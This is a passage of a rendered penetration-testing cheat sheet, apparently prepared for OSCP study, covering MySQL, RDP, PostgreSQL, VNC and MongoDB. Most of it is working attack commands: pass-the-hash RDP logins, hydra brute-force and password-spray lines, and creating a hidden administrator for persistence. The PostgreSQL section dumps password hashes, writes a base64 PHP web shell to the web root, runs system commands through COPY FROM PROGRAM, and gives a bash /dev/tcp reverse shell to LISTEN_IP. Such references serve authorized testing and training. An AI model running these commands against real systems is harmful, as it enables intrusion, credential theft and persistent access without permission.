0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003eConfiguration Files:\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003eWindows\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003econfig.ini\u003c/li\u003e\n\u003cli\u003emy.ini\u003c/li\u003e\n\u003cli\u003ewindows\\my.ini\u003c/li\u003e\n\u003cli\u003ewinnt\\my.ini\u003c/li\u003e\n\u003cli\u003eINSTALL_DIR/mysql/data/\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eUnix\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003emy.cnf\u003c/li\u003e\n\u003cli\u003e/etc/my.cnf\u003c/li\u003e\n\u003cli\u003e/etc/mysql/my.cnf\u003c/li\u003e\n\u003cli\u003e/var/lib/mysql/my.cnf\u003c/li\u003e\n\u003cli\u003e~/.my.cnf\u003c/li\u003e\n\u003cli\u003e/etc/my.cnf\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eCommand History:\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e~/.mysql.history\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eLog Files:\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003econnections.log\u003c/li\u003e\n\u003cli\u003eupdate.log\u003c/li\u003e\n\u003cli\u003ecommon.log\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.18 RDP - 3389\u003c/h2\u003e\u003ca id=\"user-content-218-rdp---3389\" class=\"anchor\" aria-label=\"Permalink: 2.18 RDP - 3389\" href=\"#218-rdp---3389\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eConnect to Windows RDP\u003c/strong\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"xfreerdp /d:domain /u:username /p:password +clipboard /cert:ignore /size:960x680 /v:$VICTIM_IP\n# to attach a drive, use:\n# /drive:share,/mnt/vm-share/oscp/labs/public/5-alice/loot\n\n# using pass-the-hash to connect:\n# replace /p: with /pth:NTHASH\nxfreerdp /u:Administrator /d:SVCORP /pth:63485d30576a1a741106e3e800053b34 /v:$VICTIM_IP\"\u003e\u003cpre\u003exfreerdp /d:domain /u:username /p:password +clipboard /cert:ignore /size:960x680 /v:\u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e to attach a drive, use:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e /drive:share,/mnt/vm-share/oscp/labs/public/5-alice/loot\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e using pass-the-hash to connect:\u003c/span\u003e\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e replace /p: with /pth:NTHASH\u003c/span\u003e\nxfreerdp /u:Administrator /d:SVCORP /pth:63485d30576a1a741106e3e800053b34 /v:\u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eBruteforce RDP Credentials:\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# brute force single user's password (watch out for account lockout! check password policy with MSRPC)\nhydra -l Administrator -P /usr/share/wordlists/rockyour.txt rdp://VICTIM_IP\n\n# password spray against list of users\nhydra -L /usr/share/wordlists/dirb/others/names.txt -p \u0026quot;SuperS3cure1337#\u0026quot; rdp://VICTIM_IP\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e brute force single user's password (watch out for account lockout! check password policy with MSRPC)\u003c/span\u003e\nhydra -l Administrator -P /usr/share/wordlists/rockyour.txt rdp://VICTIM_IP\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e password spray against list of users\u003c/span\u003e\nhydra -L /usr/share/wordlists/dirb/others/names.txt -p \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eSuperS3cure1337#\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e rdp://VICTIM_IP\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eAdd RDP User\u003c/strong\u003e: (good for persistence)\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-powershell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"net user derp herpderp /add\nnet localgroup Administrators derp /add\nnet localgroup \u0026quot;Remote Desktop Users\u0026quot; derp /add\n# enable remote desktop\nreg add \u0026quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\u0026quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f\n# delete user\nnet user hacker /del\n# disable remote desktop\nreg add \u0026quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\u0026quot; /v fDenyTSConnections /t REG_DWORD /d 1 /f\"\u003e\u003cpre\u003enet user derp herpderp \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eadd\nnet localgroup Administrators derp \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eadd\nnet localgroup \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eRemote Desktop Users\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e derp \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003eadd\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e enable remote desktop\u003c/span\u003e\nreg add \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ev fDenyTSConnections \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003et REG_DWORD \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ed \u003cspan class=\"pl-c1\"\u003e0\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ef\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e delete user\u003c/span\u003e\nnet user hacker \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003edel\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e disable remote desktop\u003c/span\u003e\nreg add \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ev fDenyTSConnections \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003et REG_DWORD \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ed \u003cspan class=\"pl-c1\"\u003e1\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e/\u003c/span\u003ef\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.19 PostgreSQL - 5432\u003c/h2\u003e\u003ca id=\"user-content-219-postgresql---5432\" class=\"anchor\" aria-label=\"Permalink: 2.19 PostgreSQL - 5432\" href=\"#219-postgresql---5432\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql\" rel=\"nofollow\"\u003eHackTricks - Pentesting PostgreSQL\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eConnect:\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"psql -U \u0026lt;myuser\u0026gt; # Open psql console with user (default: postgres)\npsql -h \u0026lt;host\u0026gt; -U \u0026lt;username\u0026gt; -d \u0026lt;database\u0026gt; # Remote connection\npsql -h \u0026lt;host\u0026gt; -p \u0026lt;port\u0026gt; -U \u0026lt;username\u0026gt; -W \u0026lt;password\u0026gt; \u0026lt;database\u0026gt; # Remote connection\"\u003e\u003cpre\u003epsql -U \u003cspan class=\"pl-k\"\u003e\u0026lt;\u003c/span\u003emyuser\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Open psql console with user (default: postgres)\u003c/span\u003e\npsql -h \u003cspan class=\"pl-k\"\u003e\u0026lt;\u003c/span\u003ehost\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e -U \u003cspan class=\"pl-k\"\u003e\u0026lt;\u003c/span\u003eusername\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e -d \u003cspan class=\"pl-k\"\u003e\u0026lt;\u003c/span\u003edatabase\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Remote connection\u003c/span\u003e\npsql -h \u003cspan class=\"pl-k\"\u003e\u0026lt;\u003c/span\u003ehost\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e -p \u003cspan class=\"pl-k\"\u003e\u0026lt;\u003c/span\u003eport\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e -U \u003cspan class=\"pl-k\"\u003e\u0026lt;\u003c/span\u003eusername\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e -W \u003cspan class=\"pl-k\"\u003e\u0026lt;\u003c/span\u003epassword\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e\u0026lt;\u003c/span\u003edatabase\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e Remote connection\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eInteracting/Useful commands:\u003c/strong\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eNOTE\u003c/strong\u003e: \u003ccode\u003epsql\u003c/code\u003e supports tab completion for table names, db names.\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"-- List databases\nSELECT datname FROM pg_database;\n\\l\n\\list\n\n-- List schemas\nSELECT schema_name,schema_owner FROM information_schema.schemata;\n\\dn+\n\n\\c \u0026lt;database\u0026gt; -- use (connect to) the database\n\\d -- List tables\n\\d+ \u0026lt;tablename\u0026gt; -- describe table\n-- SQL standard way to describe table:\nselect column_name, data_type from information_schema.columns where table_name = \u0026lt;tablename\u0026gt;\n\n-- Get current user\nSelect user;\n\\du+ -- Get users roles\n\n--Read credentials (usernames + pwd hash)\nSELECT usename, passwd from pg_shadow;\n\n-- Get languages\nSELECT lanname,lanacl FROM pg_language;\n\n-- Show installed extensions\nSHOW rds.extensions;\n\n-- Get history of commands executed\n\\s\n\n-- Check if current user is superuser \n-- (superuser always has file read/write/execute permissions)\n-- 'on' if true, 'off' if false\nSELECT current_setting('is_superuser');\"\u003e\u003cpre lang=\"postgresql\" class=\"notranslate\"\u003e\u003ccode\u003e-- List databases\nSELECT datname FROM pg_database;\n\\l\n\\list\n\n-- List schemas\nSELECT schema_name,schema_owner FROM information_schema.schemata;\n\\dn+\n\n\\c \u0026lt;database\u0026gt; -- use (connect to) the database\n\\d -- List tables\n\\d+ \u0026lt;tablename\u0026gt; -- describe table\n-- SQL standard way to describe table:\nselect column_name, data_type from information_schema.columns where table_name = \u0026lt;tablename\u0026gt;\n\n-- Get current user\nSelect user;\n\\du+ -- Get users roles\n\n--Read credentials (usernames + pwd hash)\nSELECT usename, passwd from pg_shadow;\n\n-- Get languages\nSELECT lanname,lanacl FROM pg_language;\n\n-- Show installed extensions\nSHOW rds.extensions;\n\n-- Get history of commands executed\n\\s\n\n-- Check if current user is superuser \n-- (superuser always has file read/write/execute permissions)\n-- 'on' if true, 'off' if false\nSELECT current_setting('is_superuser');\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eReading text files:\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"select string_agg((select * from pg_read_file('/etc/passwd', 0, 1000000)), ' | ')\"\u003e\u003cpre lang=\"postgresql\" class=\"notranslate\"\u003e\u003ccode\u003eselect string_agg((select * from pg_read_file('/etc/passwd', 0, 1000000)), ' | ')\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eWriting 1-liner text files:\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"-- base64 payload: '\u0026lt;?php system($_GET[\u0026quot;cmd\u0026quot;]);?\u0026gt;'\ncopy (select convert_from(decode('PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4K','base64'),'utf-8')) to '/var/www/html/ws.php'\"\u003e\u003cpre lang=\"postgresql\" class=\"notranslate\"\u003e\u003ccode\u003e-- base64 payload: '\u0026lt;?php system($_GET[\"cmd\"]);?\u0026gt;'\ncopy (select convert_from(decode('PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4K','base64'),'utf-8')) to '/var/www/html/ws.php'\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eCode Execution:\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Drop the table you want to use if it already exists\nCREATE TABLE cmd_exec(cmd_output text); -- Create the table you want to hold the command output\nCOPY cmd_exec FROM PROGRAM 'id';        -- Run the system command via the COPY FROM PROGRAM function\nSELECT * FROM cmd_exec;                 -- [Optional] View the results\nDROP TABLE IF EXISTS cmd_exec;          -- [Optional] Remove the table\"\u003e\u003cpre lang=\"postgresql\" class=\"notranslate\"\u003e\u003ccode\u003eDROP TABLE IF EXISTS cmd_exec;          -- [Optional] Drop the table you want to use if it already exists\nCREATE TABLE cmd_exec(cmd_output text); -- Create the table you want to hold the command output\nCOPY cmd_exec FROM PROGRAM 'id';        -- Run the system command via the COPY FROM PROGRAM function\nSELECT * FROM cmd_exec;                 -- [Optional] View the results\nDROP TABLE IF EXISTS cmd_exec;          -- [Optional] Remove the table\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eYou can put any bash shell command in the string after PROGRAM (e.g. replace \u003ccode\u003e'id'\u003c/code\u003e with \u003ccode\u003e'/bin/bash -c \\\"bash -i \u0026gt;\u0026amp; /dev/tcp/LISTEN_IP/443 0\u0026gt;\u0026amp;1\\\"'\u003c/code\u003e.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003ePostgres syntax is different from MySQL and MSSQL, and it's stricter about types. This leads to differences when doing SQL injection.\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003eString concat operator: \u003ccode\u003e||\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eLIKE operator: \u003ccode\u003e~~\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eMatch regex (case sensitive): \u003ccode\u003e~\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.postgresql.org/docs/6.3/c09.htm\" rel=\"nofollow\"\u003eMore operator documentation\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-error-based\"\u003ePayloadsAllTheThings\u003c/a\u003e has great documentation on Postgres injection.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eInteresting Groups/Roles:\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003epg_execute_server_program\u003c/code\u003e\u003c/strong\u003e can \u003cstrong\u003eexecute\u003c/strong\u003e programs\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003epg_read_server_files\u003c/code\u003e\u003c/strong\u003e can \u003cstrong\u003eread\u003c/strong\u003e files\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003epg_write_server_files\u003c/code\u003e\u003c/strong\u003e can \u003cstrong\u003ewrite\u003c/strong\u003e files\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.20 VNC - 5900,5800\u003c/h2\u003e\u003ca id=\"user-content-220-vnc---59005800\" class=\"anchor\" aria-label=\"Permalink: 2.20 VNC - 5900,5800\" href=\"#220-vnc---59005800\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eVNC is a graphical remote desktop sharing system running on TCP port 5900, with a web interface on port 5800.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# nmap scan\nnmap -v -n -sV --script vnc-info,realvnc-auth-bypass,vnc-title -oA nmap/vnc -p 5900 $VICTIM_IP\n\n# connect ('-passwd passwd.txt' to use password file)\nvncviewer $VICTIM_IP\n\n# bruteforcing\nhydra -V -f -L user.txt P pass.txt -s PORT vnc://$VICTIM_IP\nmedusa-h $VICTIM_IP u root -P pass.txt M vnc\nncrack -V --user root -P pass.txt $VICTIM_IP:PORT\npatator vnc_login host=$VICTIM_IP password=FILE0 0=pass.txtt 1 x retry:fgep!='Authentication failure' --max-retries 0 x quit:code=0use auxiliary/scanner/vnc/vnc_login\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e nmap scan\u003c/span\u003e\nnmap -v -n -sV --script vnc-info,realvnc-auth-bypass,vnc-title -oA nmap/vnc -p 5900 \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e connect ('-passwd passwd.txt' to use password file)\u003c/span\u003e\nvncviewer \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e bruteforcing\u003c/span\u003e\nhydra -V -f -L user.txt P pass.txt -s PORT vnc://\u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e\nmedusa-h \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e u root -P pass.txt M vnc\nncrack -V --user root -P pass.txt \u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e:PORT\npatator vnc_login host=\u003cspan class=\"pl-smi\"\u003e$VICTIM_IP\u003c/span\u003e password=FILE0 0=pass.txtt 1 x retry:fgep\u003cspan class=\"pl-k\"\u003e!\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003eAuthentication failure\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e --max-retries 0 x quit:code=0use auxiliary/scanner/vnc/vnc_login\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003e2.21 MongoDB - 27017\u003c/h2\u003e\u003ca id=\"user-content-221-mongodb---27017\" class=\"anchor\" aria-label=\"Permalink: 2.21 MongoDB - 27017\" href=\"#221-mongodb---27017\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003eMongoDB is a common open-source NoSQL database. It's service runs on 27017 by\ndefault.\u003c/p\u003e\n\u003cp dir=\"auto\"\u003eCompared to SQL databases:\u003c/p\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003eInstead of tables, it has \u003cem\u003ecollections\u003c/em\u003e\u003c/li\u003e\n\u003cli\u003eInstead of rows, it has \u003cem\u003edocuments\u003c/em\u003e\u003c/li\u003e\n\u003cli\u003eInstead of columns, it has \u003cem\u003efields\u003c/em\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp dir=\"auto\"\u003eData is stored using \u003ca href=\"https://bsonspec.org/\" rel=\"nofollow\"\u003eBSON\u003c/a\u003e, which is a binary-serialized form of JSON.\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-sql notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"# starting mongo app, connecting to database server\nmongosh     # connect to localhost:27017, no creds\nmongosh -u \u0026lt;user\u0026gt; -p \u0026lt;password\u0026gt;\nmongosh hostname:port\nmongosh --host \u0026lt;host\u0026gt; --port \u0026lt;port\u0026gt;\n\n# show list of databases\nshow databases;\n# connect to database named \u0026quot;admin\u0026quot;\nuse admin;\n# list names of collections (tables) in connected database\ndb.getCollectionNames();\n# create new collection (table) called \u0026quot;users\u0026quot;\ndb.createCollection(\u0026quot;users\u0026quot;)\n# create new document (row) in users collection:\ndb.users.insert({id:\u0026quot;1\u0026quot;, username: \u0026quot;derp\u0026quot;, email: \u0026quot;derp@derp.com\u0026quot;, password: \u0026quot;herpderp\u0026quot;})\n# show all documents (rows) in the users collection:\ndb.users.find()\n# get all documents matching search criteria\ndb.users.find({id: {$gt: 5}})\n# get first matching user document\ndb.users.findOne({id: '1'})\n# change fields in a users document\ndb.users.update({id:\u0026quot;1\u0026quot;}, {$set: {username: \u0026quot;bubba\u0026quot;}});\n# delete a document (by id)\ndb.users.remove({'id':'1'})\n# drop the users collection (delete everything)\ndb.users.drop()\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e starting mongo app, connecting to database server\u003c/span\u003e\nmongosh     \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e connect to localhost:27017, no creds\u003c/span\u003e\nmongosh \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003eu \u003cspan class=\"pl-k\"\u003e\u0026lt;\u003c/span\u003euser\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"pl-k\"\u003e-\u003c/span\u003ep \u003cspan class=\"pl-k\"\u003e\u0026lt;\u003c/span\u003epassword\u003cspan class=\"pl-k\"\u003e\u0026gt;\u003c/span\u003e\nmongosh hostname:port\nmongosh \u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e--\u003c/span\u003ehost \u0026lt;host\u0026gt; --port \u0026lt;port\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e show list of databases\u003c/span\u003e\nshow databases;\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e connect to database named \"admin\"\u003c/span\u003e\nuse admin;\n\u003cspan class=\"pl-c\"\u003e\u003cspan class=\"pl-c\"\u003e#\u003c/span\u003e list names of collections (tables) in connected database\u003c/span\u003e\n\u003cspan class=\"pl-c1\"\u003edb\u003c/span\u003e.\u003cspan class=\"pl-c1\"\u003egetCollectionNames\u003c/span\u003e();\n\u003cspan 